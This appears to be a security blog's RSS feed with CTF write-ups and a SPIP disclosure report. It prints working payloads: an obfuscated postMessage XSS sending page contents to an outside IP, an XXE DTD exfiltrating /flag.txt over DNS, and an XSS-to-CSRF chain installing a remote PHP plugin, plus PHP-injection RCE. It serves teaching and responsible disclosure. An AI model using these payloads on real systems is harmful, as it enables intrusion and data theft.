<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on SpawnZii</title>
        <link>https://SpawnZii.github.io/posts/</link>
        <description>Recent content in Posts on SpawnZii</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-us</language>
        <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
        <lastBuildDate>Sun, 25 Dec 2022 02:09:19 +0100</lastBuildDate>
        <atom:link href="https://SpawnZii.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>[Avent ESNA] Web - 777 Cyber casino</title>
            <link>https://SpawnZii.github.io/posts/2022/12/avent-esna-web-777-cyber-casino/</link>
            <pubDate>Sun, 25 Dec 2022 02:09:19 +0100</pubDate>
            
            <guid>https://SpawnZii.github.io/posts/2022/12/avent-esna-web-777-cyber-casino/</guid>
            <description>Introduction Every year ESNA organizes a CTF as an advent calendar, so there is a new challenge every day on a different theme, like pwn, forensic, programming, reverse and web. To motivate students to participate, the TOP 8 of the general ranking will be selected to participate in the CTF of EC2. The challenges are proposed by Worty &amp;amp; iHuggsy, but also by other trusted students ;).
I was lucky enough to be able to create a challenge for the occasion, so I will start with this one.</description>
            <content type="html"><![CDATA[<hr>
<h2 id="introduction">Introduction</h2>
<p>Every year ESNA organizes a CTF as an advent calendar, so there is a new challenge every day on a different theme, like pwn, forensic, programming, reverse and web. To motivate students to participate, the TOP 8 of the general ranking will be selected to participate in the CTF of EC2. The challenges are proposed by Worty &amp; iHuggsy, but also by other trusted students ;).</p>
<p><img src="/posts/777/home.png" alt="form"></p>
<p>I was lucky enough to be able to create a challenge for the occasion, so I will start with this one.</p>
<hr>
<h2 id="web-1--777-cyber-casino">Web-1 : 777 Cyber Casino</h2>
<ul>
<li><strong>Description</strong>: &ldquo;<em>Un casino en ligne va ouvrir ces portes, vous avez été mandaté pour le pentest.</em>&rdquo;</li>
<li><strong>Solves</strong>: 6</li>
<li><strong>Difficulty</strong>: <del>Easy</del> Medium</li>
<li><strong>Author</strong> : SpawnZii</li>
</ul>
<hr>
<p><img src="/posts/777/homecas.png" alt="form"></p>
<p>The site represents an online casino, there are several features:</p>
<ul>
<li>A login/register page.</li>
<li>Pages with roulette and slot machine games.</li>
<li>A user page with an identity verification form .</li>
</ul>
<h2 id="inspection-of-login-requests">Inspection of login requests.</h2>
<p>The first thing we could notice on the login is the presence of a <code>url</code> parameter.</p>
<p><img src="/posts/777/opr.png" alt="form"></p>
<p>Which makes us think of the exploitation of an open redirect and thus of a potential client vulnerability.</p>
<h2 id="inspection-of-the-account-page">Inspection of the account page.</h2>
<p>On the account.php page we find a file upload form and a verification id button.</p>
<p><img src="/posts/777/account.png" alt="form"></p>
<p>After some attempts on the file upload we realize that it is not vulnerable. It allows the user to upload his ID and retrieve it via a url.</p>
<h2 id="inspection-of-verification-request">Inspection of verification request.</h2>
<p>This function takes as parameter the url of the file uploaded by the user.</p>
<p><img src="/posts/777/verif.png" alt="form"></p>
<p>When trying to modify the url sent, like this <code>document_url=https://spawnzii.fr/?ping</code> we realize that the backend filters the url and we see an error message.</p>
<p><img src="/posts/777/error.png" alt="form"></p>
<p>We will try to play with the parser to send a different url. There were several possibilities.</p>
<ul>
<li>Use the open redirect found before.</li>
<li>Trick the url with <code>@</code> <strong>https://ů.cc@www.google.com</strong>.</li>
<li>Create a subdomain like this : <code>ů.cc.spawnzii.fr</code>.</li>
</ul>
<p>Here I will choose to use the open redirect, we must first bypass the parser on the url parameter. After some attempts we quickly understand that the backend only verifies that the domain name is present in the url. We can therefore use <code>https://xn--3ga.cc/login.php?url=https://www.google.com/?xn--3ga.cc</code> as a payload.</p>
<p><img src="/posts/777/bypass.png" alt="form"></p>
<p>We can try to send the following request to learn more about the process.</p>
<p><img src="/posts/777/bot.png" alt="form"></p>
<p>One minute later we receive our ping on our netcat.</p>
<p><img src="/posts/777/pong.png" alt="form"></p>
<p>We can now validate that we need to exploit a client attack.</p>
<h2 id="find-the-xss">Find the XSS.</h2>
<p>By inspecting the source code of the roulette we find a button calling two javascript functions.</p>
<p><img src="/posts/777/btn.png" alt="form"></p>
<h2 id="play-function">Play() function.</h2>
<p>This function will create an iframe from the following url <code>https://ů.cc/table2.php</code> if the iframe is not already present.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">play</span>(){
    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;table2&#39;</span>)){
        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">table</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">createElement</span>(<span style="color:#e6db74">&#39;iframe&#39;</span>);
        <span style="color:#a6e22e">table</span>.<span style="color:#a6e22e">setAttribute</span>(<span style="color:#e6db74">&#34;src&#34;</span>,<span style="color:#e6db74">&#34;https://ů.cc/table2.php&#34;</span>);
        <span style="color:#a6e22e">table</span>.<span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;table2&#39;</span>;
        <span style="color:#a6e22e">table</span>.<span style="color:#a6e22e">style</span>.<span style="color:#a6e22e">width</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;1900px&#34;</span>;
        <span style="color:#a6e22e">table</span>.<span style="color:#a6e22e">style</span>.<span style="color:#a6e22e">height</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;500px&#34;</span>;
        <span style="color:#a6e22e">table</span>.<span style="color:#a6e22e">style</span>.<span style="color:#a6e22e">border</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;none&#34;</span>;
        document.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">appendChild</span>(<span style="color:#a6e22e">table</span>);
        
    }
    <span style="color:#66d9ef">else</span>{
        <span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#39;You can play on two tables maximum&#39;</span>)
    }
}
</code></pre></div><h2 id="sendvalue-function">sendValue() function.</h2>
<p>This function allows to transfer the amount of the balance of the user to the iframe via a post message.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">sendValue</span>(){
    <span style="color:#66d9ef">if</span>(document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;table2&#39;</span>)){
    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">message</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">bankValue</span>;
    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">iframe</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">querySelector</span>(<span style="color:#e6db74">&#34;iframe&#34;</span>);
    <span style="color:#a6e22e">iframe</span>.<span style="color:#a6e22e">contentWindow</span>.<span style="color:#a6e22e">postMessage</span>(<span style="color:#a6e22e">message</span>, <span style="color:#e6db74">&#34;*&#34;</span>);
    }
}

window.<span style="color:#a6e22e">setInterval</span>(<span style="color:#66d9ef">function</span>(){
    <span style="color:#a6e22e">sendValue</span>();
  },
</code></pre></div><h2 id="analysis-of-table2php">Analysis of table2.php</h2>
<p>On the table2.php page we found this script:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
  window.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#39;message&#39;</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">event</span>) {
	  document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;bankSpan&#39;</span>).<span style="color:#a6e22e">innerHTML</span><span style="color:#f92672">=</span><span style="color:#a6e22e">event</span>.<span style="color:#a6e22e">data</span>;
	  <span style="color:#a6e22e">bankValue</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">event</span>.<span style="color:#a6e22e">data</span>; 
	});
<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
</code></pre></div><p>As you may have guessed, we are going to use an <strong>postmessage vulnerabilite</strong> :) As the add event listener does not verify the origin of the message, we will be able to send our own message which will be inserted in an innerHTML.</p>
<ul>
<li>First step make a request on account.php :</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">xhr</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
<span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;//xn--3ga.cc/account.php&#34;</span>, <span style="color:#66d9ef">false</span>);
<span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">send</span>();

<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">x</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">responseText</span>;
document.<span style="color:#a6e22e">location</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://161.97.163.247:4444/?flag=&#34;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">btoa</span>(<span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">responseText</span>);

</code></pre></div><ul>
<li>Create an iframe that will send our payload ans place it on your web server:</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">iframe</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://xn--3ga.cc/table2.php&#34;</span> 
<span style="color:#a6e22e">onload</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;this.contentWindow.postMessage(&#39;&lt;img/src/onerror=eval(atob(&#34;</span>
<span style="color:#a6e22e">dmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwp4a</span>
<span style="color:#a6e22e">HIub3BlbigiR0VUIiwgIi8veG4tLTNnYS5jYy9hY2NvdW50LnBocCIsIGZ</span>
<span style="color:#a6e22e">hbHNlKTsKeGhyLnNlbmQoKTsKCmxldCB4ID0geGhyLnJl</span>
<span style="color:#a6e22e">c3BvbnNlVGV4dDsKZG9jdW1lbnQubG9jYXRpb249Imh0d</span>
<span style="color:#a6e22e">HA6Ly8xNjEuOTcuMTYzLjI0Nzo0NDQ0Lz9mbGFnPSIrYn</span>
<span style="color:#a6e22e">RvYSh4aHIucmVzcG9uc2VUZXh0KTs</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;))&gt;&#39;,&#39;*&#39;)&#34;</span><span style="color:#f92672">&gt;</span>
</code></pre></div><ul>
<li>We can send the payload to the bot.</li>
</ul>
<p><img src="/posts/777/final.png" alt="form"></p>
<p>And we got the flag :)</p>
<p><img src="/posts/777/flag.png" alt="form"></p>
]]></content>
        </item>
        
        <item>
            <title>[Avent ESNA] Web - Papa noël gère ses documents Introduction</title>
            <link>https://SpawnZii.github.io/posts/2022/12/avent-esna-web-papa-no%C3%ABl-g%C3%A8re-ses-documents-introduction/</link>
            <pubDate>Sun, 25 Dec 2022 02:04:10 +0100</pubDate>
            
            <guid>https://SpawnZii.github.io/posts/2022/12/avent-esna-web-papa-no%C3%ABl-g%C3%A8re-ses-documents-introduction/</guid>
            <description>Introduction Every year ESNA organizes a CTF as an advent calendar, so there is a new challenge every day on a different theme, like pwn, forensic, programming, reverse and web. To motivate students to participate, the TOP 8 of the general ranking will be selected to participate in the CTF of EC2. The challenges are proposed by Worty &amp;amp; iHuggsy, but also by other trusted students ;).
I will try to explain you how I solved the web challenge.</description>
            <content type="html"><![CDATA[<hr>
<h2 id="introduction">Introduction</h2>
<p>Every year ESNA organizes a CTF as an advent calendar, so there is a new challenge every day on a different theme, like pwn, forensic, programming, reverse and web. To motivate students to participate, the TOP 8 of the general ranking will be selected to participate in the CTF of EC2. The challenges are proposed by Worty &amp; iHuggsy, but also by other trusted students ;).</p>
<p>I will try to explain you how I solved the web challenge.</p>
<hr>
<ul>
<li><strong>Description</strong> : &ldquo;<em>Papa noël a développé une appli (et oui encore) accessible en interne pour ses lutins. Cette application sert à stocker les documents, et il est possible de les rechercher via leur nom. Vous êtes un lutin malveillant et vous voulez accéder au fichier secret “flag.txt” qui se trouve à la racine. Trouvez un moyen d’exploiter cette application pour y arriver.</em>&rdquo;</li>
<li><strong>Solves</strong> : 6</li>
<li><strong>Difficulty</strong> : Medium</li>
<li><strong>Author</strong> : Worty</li>
</ul>
<hr>
<h2 id="recon">Recon</h2>
<p>On the site we have two different endpoints:</p>
<ul>
<li>The first allows us to upload a file, which is renamed and sent to a /upload folder.</li>
<li>The second allows us to search on the name of the upload files.</li>
</ul>
<p>The first thing we notice is that the server responds in <strong>xml</strong>.</p>
<p><img src="/posts/xxe/se.png" alt="form"></p>
<p>We start by testing the most classic payloads, without success.</p>
<p><img src="/posts/xxe/test.png" alt="form"></p>
<p>My first reflex was to test for an OOB XXE. So we have to load a <strong>dtd</strong> file from our web server, so we test if the machine can access the internet.</p>
<p><img src="/posts/xxe/test2.png" alt="form"></p>
<p>I immediately noticed that there were only <strong>DNS</strong> requests and no <strong>HTTP</strong> requests. Which means that it will be impossible to load our dtd from the internet.</p>
<p><img src="/posts/xxe/collab.png" alt="form"></p>
<p>And him, do we forget him ?</p>
<p><img src="/posts/xxe/up.png" alt="form"></p>
<p>You understood, we will be able to upload our <strong>dtd</strong> here and fetch it locally.</p>
<h2 id="exploitation-of-an-blind-xxe-with-dns-exfiltration">Exploitation of an BLIND XXE with DNS exfiltration.</h2>
<ul>
<li>On the search use the following payload :</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; ?&gt;</span>
<span style="color:#75715e">&lt;!DOCTYPE r [
</span><span style="color:#75715e">&lt;!ELEMENT r ANY &gt;</span>
<span style="color:#75715e">&lt;!ENTITY % sp SYSTEM &#34;file:///var/www/html/uploads/c8902d1504e3022524e0120ff3c844.dtd&#34;&gt;</span>
%sp;
%param1;
]&gt;
<span style="color:#f92672">&lt;data&gt;&lt;search&gt;</span>
&amp;attack;<span style="color:#f92672">&lt;/search&gt;&lt;limit&gt;</span>10<span style="color:#f92672">&lt;/limit&gt;&lt;/data&gt;</span>
</code></pre></div><p><img src="/posts/xxe/pld.png" alt="form"></p>
<ul>
<li>Upload the a file call file.dtd with the following content :</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;!ENTITY % vuln1 SYSTEM &#34;php://filter/convert.base64-encode/resource=/flag.txt&#34;&gt;</span>
<span style="color:#75715e">&lt;!ENTITY % vuln2 &#34;&lt;!ENTITY attack SYSTEM &#39;http://%vuln1;.s81wuau8i8pw9w2gu5ko83yfs6yxmpae.oastify.com/&#39;&gt;</span>&#34;&gt;
%vuln2;
</code></pre></div><p><img src="/posts/xxe/dtd.png" alt="form"></p>
<ul>
<li>Copy the filename on your search payload.</li>
<li>Send the request and get the flag via DNS exfiltration ;).</li>
</ul>
<p><img src="/posts/xxe/flagdns.png" alt="form"></p>
<p><img src="/posts/xxe/flag.png" alt="form"></p>
]]></content>
        </item>
        
        <item>
            <title>How we have pwned Root-Me in 2022</title>
            <link>https://SpawnZii.github.io/posts/2022/07/how-we-have-pwned-root-me-in-2022/</link>
            <pubDate>Tue, 12 Jul 2022 13:02:46 +0200</pubDate>
            
            <guid>https://SpawnZii.github.io/posts/2022/07/how-we-have-pwned-root-me-in-2022/</guid>
            <description>Introduction Hello, I&amp;rsquo;m currently a student at ESNA and I&amp;rsquo;m passionate about web application security. This article describes the discovery of several critical vulnerabilities in the SPIP CMS and Root-Me.
With a friend (cc Abyss Watcher) we decided to search for vulnerabilities on the SPIP/Root-Me. From the first days, we managed to find some bugs, XSS, CSRF and later we will discover a RCE.
Environment Of course we did not our research directly on root me.</description>
            <content type="html"><![CDATA[<h2 id="introduction">Introduction</h2>
<p>Hello,
I&rsquo;m currently a student at ESNA and I&rsquo;m passionate about web application security. This article describes the discovery of several critical vulnerabilities in the SPIP CMS and <a href="https://www.root-me.org/">Root-Me</a>.</p>
<p>With a friend (cc <a href="https://github.com/Abyss-W4tcher">Abyss Watcher</a>) we decided to search for vulnerabilities on the SPIP/Root-Me. From the first days, we managed to find some bugs, XSS, CSRF and later we will discover a RCE.</p>
<h2 id="environment">Environment</h2>
<p>Of course we did not our research directly on root me. So we set up a local spip environment.</p>
<ul>
<li>SPIP version 4.1.2 <a href="https://files.spip.net/spip/archives/spip-v4.1.2.zip">https://files.spip.net/spip/archives/spip-v4.1.2.zip</a></li>
<li><a href="https://twitter.com/TheLaluka">Laluka&rsquo;s</a> <a href="https://thinkloveshare.com/hacking/rce_on_spip_and_root_me/">docker-compose file</a>:</li>
</ul>
<pre><code class="language-yaml=" data-lang="yaml=">version: '3.5'

services:
  db:
    image: mysql:5.6
    command: --default-authentication-plugin=mysql_native_password
    environment:
        - MYSQL_ROOT_PASSWORD=root
    ports:
        - 3306:3306

  adminer:
    image: adminer
    ports:
        - 81:8080

  spip:
    image: php:8.0
    ports:
        - 80:80
    volumes:
        - ./spip:/spip
    working_dir: /spip
    entrypoint: [&quot;bash&quot;, &quot;-c&quot;, &quot;apt update &amp;&amp; apt install -y default-mysql-client &amp;&amp; docker-php-ext-install mysqli &amp;&amp; apt install -y libzip-dev zip &amp;&amp; docker-php-ext-install zip &amp;&amp; php -S 0.0.0.0:80&quot;]
</code></pre><ul>
<li>We have also activated the &ldquo;<a href="https://www.spip.net/fr_article4642.html">parano</a>&rdquo; mode, this mode allows to disable the execution of javascript in the articles.</li>
</ul>
<pre><code class="language-php=" data-lang="php=">// sécuriser les scripts javascript en mode parano
$GLOBALS['filtrer_javascript'] = -1;
</code></pre><h2 id="-bug-1---a-simple-xss-to-start"># Bug 1 - A simple XSS to start</h2>
<p>After some research I managed to identify a trivial stored  XSS. An author can add hyperlink with the following payload <code>javascript:alert(document.domain)</code>, So when the user clicks on the link, the javascript will be executed.</p>
<p><img src="/posts/rmrce/pldsimplexss.png" alt="form"></p>
<p>It&rsquo;s possible to trigger the xss at several places, on the public part of the site.</p>
<p><img src="/posts/rmrce/publictriggerxss.png" alt="form"></p>
<p>And on the administration interface.</p>
<p><img src="/posts/rmrce/triggerxss.png" alt="form"></p>
<h3 id="xss-to-csrf-to-rce-">XSS to CSRF to RCE ?</h3>
<p>Now that we can run javascript several scenarios are possible via.</p>
<ul>
<li>Create a CSRF to take over the users&rsquo; accounts.</li>
<li>Create a CSRF to elevate our privileges.</li>
<li>Create a CSRF to upload a malicious plugin</li>
</ul>
<p>You guessed it, I chose the last option, for that we will look at a function of spip allowing an administrator to upload a plugin.</p>
<p><img src="/posts/rmrce/manage.png" alt="form"></p>
<p>This function allows an administrator to upload a plugin in zip format from a remote server, the plugin will be unzip and stored at <code>/plugins/auto/</code>.
By analyzing the upload request, we notice that two tokens are passed as parameters, fortunately for us, they do not change between two requests</p>
<p><img src="/posts/rmrce/token.png" alt="form"></p>
<p>It&rsquo;s time to build our payload !</p>
<h3 id="evil-plugin-setup">Evil plugin setup.</h3>
<p>The function to download a plugin waits for a zip file, so we must create our plugins on our remote server.</p>
<pre><code class="language-bash=" data-lang="bash=">┌──(spawnzii㉿spawnzii)-[/tmp/websrv]
└─$ echo '&lt;?php system(&quot;id&quot;);?&gt;' &gt; spzrce.php  
                                                                                
┌──(spawnzii㉿spawnzii)-[/tmp/websrv]
└─$ zip spzrce.zip spzrce.php 
  adding: spzrce.php (stored 0%)
</code></pre><p>Our plugin is ready, we can place it in a listening web server.</p>
<h3 id="csrf-payload-construction">CSRF payload construction.</h3>
<p>On the first part we will make a request to get the tokens.</p>
<pre><code class="language-javascript=" data-lang="javascript=">var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://localhost/ecrire/?exec=charger_plugin');
xhr.responseType = 'document';
xhr.send();
xhr.onreadystatechange = function () {
if (xhr.readyState == 4) {
  token_sign = xhr.response.getElementsByName('formulaire_action_sign')[1].value;
  token_arg = xhr.response.getElementsByName('formulaire_action_args')[1].value;
  token_sign = encodeURIComponent(token_sign);
  token_arg = encodeURIComponent(token_arg);
  }
}
</code></pre><p>Now that we have our two tokens, we can build the second request to upload a plugin.</p>
<pre><code class="language-javascript=" data-lang="javascript=">function csrf_rce() {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'http://localhost/ecrire/?exec=charger_plugin');
    xhr.responseType = 'document';
    xhr.send();

    xhr.onreadystatechange = function () {
        if (xhr.readyState == 4) {
            token_sign = xhr.response.getElementsByName('formulaire_action_sign')[1].value;
            token_arg = xhr.response.getElementsByName('formulaire_action_args')[1].value;
            token_sign = encodeURIComponent(token_sign);
            token_arg = encodeURIComponent(token_arg);
            var xhrr=new XMLHttpRequest();
            xhrr.open('POST', 'http://localhost/ecrire/?exec=charger_plugin', true);
            xhrr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
            xhrr.onload = function () {
                console.log(this.responseText);
            }
            xhrr.send(`var_ajax=form&amp;exec=charger_plugin&amp;formulaire_action=charger_plugin_archive&amp;formulaire_action_args=${token_arg}&amp;formulaire_action_sign=${token}&amp;archive=http%3A%2F%2Fyourserver%2Fspzrce.zip&amp;destination=`);
        }
    };
}

csrf_rce();
</code></pre><p>We just have to encode our payload in base64 and paste it on the hyperlink.</p>
<p><img src="/posts/rmrce/pldcsrf.png" alt="form"></p>
<p>Now that our payload is ready, all we have to do is wait for an administrator to click on the link to download the plugin.</p>
<p><img src="/posts/rmrce/o.gif#center" alt="form"></p>
<p><img src="/posts/rmrce/apresclique.png" alt="form"></p>
<p>We can go to our plugin to see the result.</p>
<p><img src="/posts/rmrce/poc.png" alt="form"></p>
<h2 id="-bug-2---on-est-bon-rien-a-faire-sounds-like-rce"># Bug 2 - &ldquo;On est bon, rien a faire&rdquo; sounds like RCE</h2>
<p>After a few xss found, we wanted to think bigger and we gave ourselves the objective to find a RCE.</p>
<p>A few days later Abyss watcher had the idea to watch the fix of an old vulnerability (cc <a href="https://twitter.com/TheLaluka">Laluka</a>).</p>
<p><img src="/posts/rmrce/patch.png" alt="form"></p>
<h3 id="what-happens-in-the-patch-">What happens in the patch ?</h3>
<p>Before the patch the <code>_oups</code> parameter was passed directly to the <code>$valeurs</code> array.
Now <code>_oups</code> expects a serialized object encoded in base64.</p>
<p><img src="/posts/rmrce/oupscommit.png" alt="form"></p>
<p>To debug more simply we have added a <code>print_r</code> of the variable <code>$valeurs</code>.
This allows us to see the result of our payload directly on the page.</p>
<h3 id="its-time-for-a-bypass">It&rsquo;s time for a bypass</h3>
<p>Now what happens if we put a simple string like <strong>http://localhost/ecrire/?exec=article&amp;id_article=1&amp;_oups=notanobject</strong> on <code>_oups</code> parameter ?</p>
<p><img src="/posts/rmrce/nv.png" alt="form"></p>
<p>Nothing, <code>_oups</code> is empty.</p>
<p>But now try to inject serialized object, like : <code>TzoxOiJBIjoxOntzOjE6ImEiO3M6MzoiUG9DIjt9</code>.</p>
<p><img src="/posts/rmrce/v.png" alt="form"></p>
<p>The string is reflected several times in the source code.</p>
<p><img src="/posts/rmrce/inj.png" alt="form"></p>
<p>We can try to inject with <strong><code>http://localhost/ecrire/?exec=article&amp;id_article=1&amp;_oups=TzoxOiJBIjoxOntzOjE6ImEiO3M6MzoiUG9DIjt9'&quot;&lt;h1&gt;inject here&lt;/h1&gt;</code></strong></p>
<p><img src="/posts/rmrce/h1.png" alt="form"></p>
<p>Damnnn, nice we have html/XSS injection.
You know what that means ???</p>
<p>Are you remember <a href="https://thinkloveshare.com/hacking/rce_on_spip_and_root_me/">the Laluka&rsquo;s RCE ?</a>
And if we try to reproduce the same thing. <strong><code>http://localhost/ecrire/?exec=article&amp;id_article=1&amp;_oups=TzoxOiJBIjoxOntzOjE6ImEiO3M6MzoiUG9DIjt9'&quot;&lt;?php system('id');?&gt;</code></strong>.</p>
<p><img src="/posts/rmrce/rcepoc.png" alt="form"></p>
<p>Here we go again &hellip;</p>
<h2 id="small-explanations">Small explanations</h2>
<p><img src="/posts/rmrce/mm.jpg" alt="form"></p>
<p>SPIP uses skeletons, a kind of html template that is used to formalise the rendering of a page. The problem here is that once the skeleton is filled in, it is passed to a function that evaluates the page (<a href="https://github.com/spip/SPIP/blob/master/ecrire/public/evaluer_page.php"><strong>evaluer_page.php</strong></a>).</p>
<p><img src="/posts/rmrce/eval.png" alt="form"></p>
<p>So as we inject into the skeleton (<strong><a href="https://github.com/spip/SPIP/blob/master/prive/formulaires/editer_liens.html">editer_lien.html</a></strong>), once passed into the function <strong>evaluate_page.php</strong> the php is interpreted.</p>
<h2 id="patch">Patch</h2>
<p>This is how oops is managed after the patch.
It is now base64 encoded and converted to json.
<img src="/posts/rmrce/p1.png" alt="form"></p>
<p>The whole thing will be passed to the html entities function</p>
<p><img src="/posts/rmrce/p2.png" alt="form"></p>
<h2 id="timeline">Timeline</h2>
<ul>
<li>
<p><strong>2022/07/05 at 3:38 PM</strong>: XSS/CSRF was discovert and report to SPIP.</p>
</li>
<li>
<p><strong>2022/07/05 at 6:07 PM</strong>: First response of SPIP.</p>
</li>
<li>
<p><strong>2022/07/12</strong> : New <a href="https://github.com/spip/SPIP/commit/d569096f346f54552ecf2b0f09c2880219288cb3">commit</a> on spip.</p>
</li>
<li>
<p><strong>2022/07/12 at 1:13 AM</strong>: Declaration of the RCE to SPIP.</p>
</li>
<li>
<p><strong>2022/07/12 at 11:18 AM</strong>: First <a href="https://github.com/spip/SPIP/commit/31691fd689234b290db5f6c9cbae9aff06aca74a">commit</a> to fix the RCE.</p>
</li>
<li>
<p><strong>2022/07/22</strong>: <a href="https://blog.spip.net/Mise-a-jour-critique-de-securite-sortie-de-SPIP-4-1-5-SPIP-4-0-8-et-SPIP-3-2-16.html">New security release</a>.</p>
</li>
</ul>
<h2 id="conclusion--thanks">Conclusion &amp; Thanks</h2>
<p>It was a great experience to share our research with <a href="https://github.com/Abyss-W4tcher">Abyss Watcher</a>. We are happy to have contributed to the security of SPIP and Root-Me. Many thanks to <a href="https://twitter.com/TheLaluka">Laluka</a> and <a href="https://twitter.com/_worty">W0rty</a> for proofreading this article.</p>
<p><img src="/posts/rmrce/sq.jpg" alt="form"></p>
<h2 id="references">References</h2>
<ul>
<li>
<p><strong>Abyss Watcher Article</strong>: <a href="https://github.com/Abyss-W4tcher/ab4yss-wr4iteups/blob/master/SPIP%204.1.2%20Vulnerabilities/SPIP_4.1.2_AUTH_RCE/SPIP_4.1.2_AUTH_RCE_Abyss_Watcher_12_07_22.md">https://github.com/Abyss-W4tcher/&hellip;</a></p>
</li>
<li>
<p><strong>Laluka&rsquo;s RCE</strong> : <a href="https://thinkloveshare.com/hacking/rce_on_spip_and_root_me/">https://thinkloveshare.com/hacking/rce_on_spip_and_root_me/</a></p>
</li>
<li>
<p><strong>SPIP release</strong> : <a href="https://blog.spip.net/Mise-a-jour-critique-de-securite-sortie-de-SPIP-4-1-5-SPIP-4-0-8-et-SPIP-3-2-16.html">https://blog.spip.net/Mise-a-jour-critique-de-securite-sortie-de-SPIP-4-1-5-SPIP-4-0-8-et-SPIP-3-2-16.html</a></p>
</li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>[Midnightflag] BGK Writeup</title>
            <link>https://SpawnZii.github.io/posts/2022/04/midnightflag-bgk-writeup/</link>
            <pubDate>Thu, 28 Apr 2022 13:52:15 +0200</pubDate>
            
            <guid>https://SpawnZii.github.io/posts/2022/04/midnightflag-bgk-writeup/</guid>
            <description>Introduction Writeup d&amp;rsquo;un challenge que j&amp;rsquo;ai proposé pour le Midnightflag ctf. L&amp;rsquo;objectif est d&amp;rsquo;obtenir le flag situé dans le fichier /root/flag.txt du serveur. Pour ce faire les joueurs devront exploiter une webapp flask.
Step 1 : Exploitation d&amp;rsquo;un cookie flask On lance une énumération classique des dossiers sur le serveur web.
gobuster dir -u http://172.17.0.2:8181/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://172.</description>
            <content type="html"><![CDATA[<h2 id="introduction">Introduction</h2>
<p>Writeup d&rsquo;un challenge que j&rsquo;ai proposé pour le Midnightflag ctf.
L&rsquo;objectif est d&rsquo;obtenir le flag situé dans le fichier /root/flag.txt du serveur.
Pour ce faire les joueurs devront exploiter une webapp flask.</p>
<p><img src="/posts/bgk/home.png" alt="form"></p>
<h2 id="step-1--exploitation-dun-cookie-flask">Step 1 : Exploitation d&rsquo;un cookie flask</h2>
<p>On lance une énumération classique des dossiers sur le serveur web.</p>
<pre><code>gobuster dir -u http://172.17.0.2:8181/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt               
===============================================================
Gobuster v3.1.0
